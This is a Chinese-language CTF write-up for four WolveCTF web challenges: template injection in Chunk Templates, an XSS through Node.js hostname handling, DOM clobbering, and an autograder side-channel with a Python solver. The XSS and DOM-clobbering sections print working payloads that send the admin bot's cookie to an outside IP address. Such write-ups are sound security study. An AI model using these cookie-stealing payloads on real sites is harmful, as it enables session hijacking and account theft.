---
title: WolveCTF
categories: 赛题wp
---



![image-20220329192052588](https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329192052588.png)

<!--more-->

# java???

Java has template engines too!

使用了一套模板 Chunk Templates，项目地址 https://github.com/tomj74/chunk-templates

![image-20220327141246968](https://raw.githubusercontent.com/yongsheng220/image/main/ctfshowimage-20220327141246968.png)

代码逻辑很简单，存在$flag变量，过滤了 `$`

![image-20220327141444675](https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220327141444675.png)

渲染时存在模板注入

![image-20220327141515475](https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220327141515475.png)

也就是说**找一种表示变量的方式来替换 $变量 的方式** ，翻看文档，在久远的英文历史文档中迷失了自我....   {$flag}

最后在 https://www.x5software.com/chunk/wiki/index.php?title=Chunk2.4

还好，找到了替换

![image-20220327142036059](https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220327142036059.png)

payload

```
/submit?name={~flag}&color=123
```

还有利用urldecode

```
{.{%24flag%7d|urldecode()}
```

FLAG：wsc{j4v4_ch4ls_4r3_r4r3_513156}

# XSS 401

Can you steal the admin bot's cookie?

Note: The version of nodejs running the admin bot is: v12.22.1

nodejs题目，发送一个url，admin会在browser中看到，审计一下代码

flag在cookie中

![image-20220329152720003](https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329152720003.png)

看一下提交url后的逻辑，首先判断是否以http https开头

然后req.hostname返回主机名，是不可控的，为wsc-2022-web-5-bvel4oasra-uc.a.run.app，需要等于我们传进去url的hostname，才能让bot看到

![image-20220329153356998](https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329153356998.png)

而且hostname返回值会将大写转为小写

![image-20220329154059717](https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329154059717.png)

但是注意到处理消息时缺少了escape操作，导致了可能存在xss，找到了CVE-2021-22931，没有poc。

> 16.6.0、14.17.4 和 12.22.4 之前的 Node.js 易受远程代码执行、XSS、应用程序崩溃的影响，因为 Node.js dns 库中缺少对域名服务器返回的主机名的输入验证，这可能导致在使用该库的应用程序中输出错误的主机名（导致域劫持）和注入漏洞。

尝试注入，没有回显

```
?url=http://<script>alert(1#</script>
```

![image-20220329155006962](https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329155006962.png)

最后卡在这里，最后看到wp：https://github.com/0xGodson/blogs/blob/master/_posts/2022-03-28-wcs-xss401.md

简单的研究了一下遇到一些特殊字符会导致错误，而且最后会自动补全前面的标签，如中间的图

![image-20220329160759020](https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329160759020.png)

**HostName 的一些 RFC**

- 不应包含空格

- 不管是大写还是小写，主机名都会被浏览器自动转换为小写

- 这里有一些破坏主机名的字符

  ```
  ? / \ # @ 
  ```

然后现在就是

- 绕过空格
- hostname允许使用Unicode
- 找到一个Unicode代替空格
- 绕过 `/` ，因为你反弹vps时 `://` 是必不可少的

根据wp，payload利用了 `%0C`，

```
<svg%0Conload=alert()>
```

给出两种思路

payload1

```
?url=http://<svg%0Conload=eval(location.hash.slice(1))>#window.location='http://1.116.110.61:4000?cookie='+document.cookie
```

- eval执行js代码
- location.hash返回的字符串是 URL 的锚部分(从 # 号开始的部分) 这里是不检测的

payload2 未成功

```
?url=http://<svg%0Conload=document.location="http"+atob('Oi8v')+"1.116.110.61:4000"+atob('ek8v').substr(2,2)+btoa(document.cookie)>

?url=http://d.com;<svg%250conload="window.location.href=(location.href.substr(0,8).replace('s','')%252b'ip_addr'%252blocation.href.substr(5,1)%252b'1234'%252blocation.href.substr(6,1)%252bdocument.cookie)">a.c
```

- 利用base编码
- substr切割

最终payload

```
https://wsc-2022-web-5-bvel4oasra-uc.a.run.app/visit?url=https://wsc-2022-web-5-bvel4oasra-uc.a.run.app/visit?url=http://<svg%0Conload=eval(location.hash.slice(1))>#window.location='http://1.116.110.61:4000?cookie='+document.cookie
```

![image-20220329174041803](https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329174041803.png)

FLAG：wsc{wh0_kn3w_d0m41n_x55_w4s_4_th1n6}

# Don't Only Mash... Clobber!

Submit an image link to our "evaluator" and steal their cookie!

先看代码逻辑

visit路由下同上道题目，传入一个url，bot会点开看

![image-20220329180308843](https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329180308843.png)

personalize路由下，提交一个url，然后传入到了img标签中，然后提示没有bypass CSP的步骤

![image-20220329180345176](https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329180345176.png)

闭合可以注入html

![image-20220329181946015](https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329181946015.png)

然后题目还有app.js

```
window.onload = () => {
    const imgSrc = document.getElementById('user-image').src
    document.getElementById('user-image-info').innerText = imgSrc

    if (DEBUG_MODE) {
        // In debug mode, send the image url to our debug endpoint for logging purposes.
        // We'd normally use fetch() but our CSP won't allow that so use an <img> instead.
        // 在调试模式下，将图像 url 发送到我们的调试端点以进行日志记录。
        // 我们通常会使用 fetch()，但我们的 CSP 不允许这样做，所以使用 <img> 代替。
        document.getElementById('body').insertAdjacentHTML('beforeend', `<img src="${DEBUG_LOGGING_URL}?auth=${btoa(document.cookie)}&image=${btoa(imgSrc)}">`)
    }
}
```

这里有一个DEBUG_MODE 参数未定义，if的操作经过翻译会发起一个携带cookie的请求，如果我们可控 DEBUG_LOGGING_URL 就可以将cookie发送到我们的vps上

![image-20220329182534181](https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329182534181.png)

利用前面那个html的注入地方来定义 DEBUG_MODE 与 DEBUG_LOGGING_URL  这样就完全可控

payload

```
https://wsc-2022-web-2-bvel4oasra-uc.a.run.app/personalize?image=http://google.com/a.png"><a id="DEBUG_MODE"><a id="DEBUG_LOGGING_URL" href="http://1.116.110.61:4000/">
```

这里有个问题，确实可以返回cookie，但是传的是https，可以弄个https服务器，不晓得有没有其平台的之类的更方便的接受

![image-20220329191335796](https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329191335796.png)



![image-20220329191359560](https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329191359560.png)



# Autoraider

My EECS 982 project is due tonight, and I haven't started it! Can you help me out?

```js
const express = require('express');
const session = require('express-session');

const multer = require('multer');
const bodyParser = require('body-parser');
const upload = multer();

const redis = require('redis');

const {VM} = require('vm2');

const SESSION_SECRET = process.env.REDIS_SECRET || 'secret';
const FLAG = process.env.FLAG || 'wsc{dummy}';

const NUM_QUESTIONS = 30;

var app = express()

let sessionOptions = {
    secret: SESSION_SECRET,
    resave: false,
    saveUninitialized: true
}

// ------ For running the challenge in Google Cloud with Redis session storage -----
// Ignore this if running locally
if(process.env.REDIS_IP) {
    var RedisStore = require('connect-redis')(session)
    const client = redis.createClient({
      "host": process.env.REDIS_IP
    });
    client.on('connect', () => console.log('Connected to Redis!'));
    client.on("error", (error) => console.error('Redis Error: ', error));
    sessionOptions['store'] = new RedisStore({ client: client });
}
// ----------------------------------------------------------------------------------

app.use(session(sessionOptions));

// Make sure correct answers always exist in session
app.use((req, res, next) => {
    if(!req.session.answers) {
        req.session.answers = generateAnswers();
    }
    next();
});

app.use(express.static('public'));

// for parsing application/json
app.use(bodyParser.json()); 

// for parsing application/xwww-
app.use(bodyParser.urlencoded({ extended: true })); 
//form-urlencoded

// for parsing multipart/form-data
app.use(upload.array()); 

app.post('/upload', async (req, res, next) => {
    try {
        let code = req.body.code;

        const vm = new VM({
            timeout: 50,
            allowAsync: false
        });
        
        // Test for correct responses for given person
        // Correct answers retrieved from user session
        const person = req.session.answers.person;
        const responses = req.session.answers.responses;
        let testCases = responses.map((response, i) => { 
            return {'person': person, 'questionNumber': i, 'correct': response}
        });
        // Add edge case
        testCases.push(
            {'person': 9999999999, 'questionNumber': 0, 'correct': false}
        )

        // Go through each test case
        for(i in testCases) {
            const testCase = testCases[i];
            const result = testCode(vm, code, testCase.person, testCase.questionNumber, testCase.correct);
            if(result.error) {
                req.session.pass = false;
                res.send(result.message);
                return;
            } else if(!result.pass) {
                req.session.pass = false;
                res.redirect('submission.html');
                return;
            }
        };
        
        req.session.pass = true;
        res.redirect('submission.html');
    } catch {
        res.send('Server side error');
    }
});

app.get('/grade', async (req, res, next) => {
    if(req.session.pass || false) {  // session.pass 需要为true
        res.send('Tests passed! Here is the flag: ' + FLAG);
    } else {
        req.session.answers = generateAnswers();
        res.send('Tests failed. Correct answers have been changed!');
    }
});

function generateAnswers() {  //生成正确答案 随机不可控
    answers = {
        'person': Math.floor(Math.random() * 7753000), // Random person in the world
        'responses': []
    };
    for(let i = 0; i < NUM_QUESTIONS; i++) {
        answers.responses.push(Math.random() > 0.5);
    }
    return answers;
}

function testCode(vm, code, person, questionNumber, correct) {
    ret = {
        message: '',
        error: false,
        pass: true
    };
    try {
        const result = vm.run(`oracle(${person}, ${questionNumber});${code}`);
        if(typeof result !== 'boolean' || result !== correct) {
            ret.pass = false;
        }
    } catch {
        ret.message = 'Code threw error! Please resubmit!';
        ret.error = true;
        ret.pass = false;
    }
    return ret;
}

app.listen(80, function () {
    console.log('Autograder server listening on port 80!');
});
```

oracle.js

```js
// REQUIRES: 
//      question_number and personId are integers
//      0 <= question_number < 30
// MODIFIES: nothing
// EFFECTS: invokes an oracle and returns the correct answer to
//      the question indexed by question_number for the person identified by personId
//      a return value of true indicates yes, and a return value of false
//      indicates no
//      if personId > 7754000, should return false
//
// Hint 1: apply the Cosmic Computation (CC) paradigm
// Hint 2: consider the core principles of Tarot readings
// Hint 3: try to traverse by pointer
function oracle(personId, questionNumber) {
    return false;
}
```

贴个脚本吧

```python
import requests

def submit_testcase(a, s):
    answers = {k: v for k, v in enumerate(a)}
    answers[len(answers)] = True
    javascript = """\
    function oracle(personId, questionNumber) {{

        answers = {}

        if (!answers.hasOwnProperty(questionNumber)){{
            throw 'x'
        }} else {{
            return answers[questionNumber];
        }};
    }};
    """.format(answers).replace("True", "true").replace("False", "false")
    r = s.post('https://autoraider-bvel4oasra-uc.a.run.app/upload', files=dict(code=(None, javascript)))
    return 'error' in r.text
def solve():
    s = requests.Session()
    s.get('https://autoraider-bvel4oasra-uc.a.run.app')

    answers = list()
    while len(answers) < 30:
        res = submit_testcase(answers, s)
        answers.append(res)

    r = s.get('https://autoraider-bvel4oasra-uc.a.run.app/grade')
    if 'flag' in r.text:
        print(r.text)
        exit(0)

def main():
    while True:
        solve()

if __name__ == '__main__':
    main()
```

